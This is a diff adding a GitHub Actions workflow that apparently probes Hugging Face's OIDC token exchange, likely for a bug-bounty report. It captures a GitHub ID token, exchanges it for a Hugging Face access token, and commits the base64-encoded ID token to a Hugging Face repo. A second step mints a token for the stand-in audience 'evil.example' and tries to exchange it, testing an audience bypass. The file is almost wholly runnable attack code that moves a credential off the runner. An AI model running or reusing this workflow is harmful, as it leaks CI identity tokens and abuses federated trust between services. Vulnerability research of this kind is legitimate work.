@@ -1,0 +1,43 @@
+name: oidc2
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - name: aud hf: exchange + capture token
+        run: |
+          set -e
+          RESP=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://huggingface.co")
+          TOKEN=$(echo "$RESP" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
+          BODY=$(python3 -c "import json,sys;print(json.dumps({'grant_type':'urn:ietf:params:oauth:grant-type:token-exchange','subject_token_type':'urn:ietf:params:oauth:token-type:id_token','subject_token':sys.argv[1],'resource':'h1testrightmeow/i47-typemix-20261108'}))" "$TOKEN")
+          curl -s -X POST https://huggingface.co/oauth/token -H 'Content-Type: application/json' -d "$BODY" > "$RUNNER_TEMP/ex.json"
+          echo EX_HF:
+          cat "$RUNNER_TEMP/ex.json"; echo
+          AT=$(python3 -c "import json;d=json.load(open('$RUNNER_TEMP/ex.json'));print(d.get('access_token',''))")
+          if [ -n "$AT" ]; then
+            B64=$(echo -n "$TOKEN" | base64 -w0)
+            python3 - "$AT" "$B64" <<'PY'
+import json,sys,urllib.request
+at,b64=sys.argv[1],sys.argv[2]
+body=json.dumps({"summary":"capture idtoken b64","files":[{"path":"tp_idtoken_b64.txt","content":b64}]}).encode()
+req=urllib.request.Request("https://huggingface.co/api/models/h1testrightmeow/i47-typemix-20261108/commit/main",data=body,headers={"Authorization":"Bearer "+at,"Content-Type":"application/json"},method="POST")
+try:
+    print(urllib.request.urlopen(req,timeout=30).read().decode()[:300])
+except Exception as e:
+    print("commit err",e)
+PY
+          fi
+      - name: aud evil: attempt exchange
+        run: |
+          RESP=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://evil.example")
+          TOKEN=$(echo "$RESP" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
+          PAYLOAD=$(echo "$TOKEN" | cut -d. -f2)
+          echo AUD_CLAIMS:
+          python3 -c "import base64,json,sys; s=sys.argv[1]; s+='='*(-len(s)%4); d=json.loads(base64.urlsafe_b64decode(s)); print(json.dumps({'aud':d.get('aud'),'repository':d.get('repository'),'ref':d.get('ref'),'workflow_ref':d.get('workflow_ref')}))" "$PAYLOAD"
+          BODY=$(python3 -c "import json,sys;print(json.dumps({'grant_type':'urn:ietf:params:oauth:grant-type:token-exchange','subject_token_type':'urn:ietf:params:oauth:token-type:id_token','subject_token':sys.argv[1],'resource':'h1testrightmeow/i47-typemix-20261108'}))" "$TOKEN")
+          echo AUD_EVIL_EXCHANGE:
+          curl -s -X POST https://huggingface.co/oauth/token -H 'Content-Type: application/json' -d "$BODY"; echo
